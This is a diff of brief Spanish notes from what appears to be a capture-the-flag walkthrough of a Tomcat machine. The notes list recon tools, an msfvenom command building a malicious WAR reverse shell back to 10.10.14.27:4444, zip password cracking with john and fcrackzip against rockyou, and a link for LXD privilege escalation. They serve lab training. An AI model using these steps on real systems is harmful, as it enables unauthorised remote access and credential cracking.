@@ -1,10 +1,33 @@
 Reconomiento
+--------------------------
+ * nmap
  * Nikto
  * Dirbuster
  * dirb
  * whatweb
-Estructura de directorios tomcat9
+
+--------------------------
+Shell 
+--------------------------
 Ataques en aplicaciones web (LFFI)
-msfvenon
-john the ripper
-LXC privilage escalation
+ * https://book.hacktricks.xyz/pentesting-web/file-inclusion
+Estructura de directorios tomcat9
+ * https://packages.ubuntu.com/en/focal/all/tomcat9/filelist
+Shell reversa mediante carga de war maliciosa (msfvenon)
+ * msfvenom -p java/shell_reverse_tcp lhost=10.10.14.27 lport=4444 -f war -o shell.war
+--------------------------
+User
+--------------------------
+Obteniendo credenciales de usuario "ash"
+#zip2john 16162020_backup.zip > zip_hash
+#john zip_hash -w=/usr/share/wordlists/rockyou.txt
+
+#fcrackzip -D -p /usr/share/wordlists/rockyou.txt -v 16162020_backup.zip
+
+
+#su ash
+--------------------------
+Root
+--------------------------
+Escalamiento de privilegios (LXC)
+https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
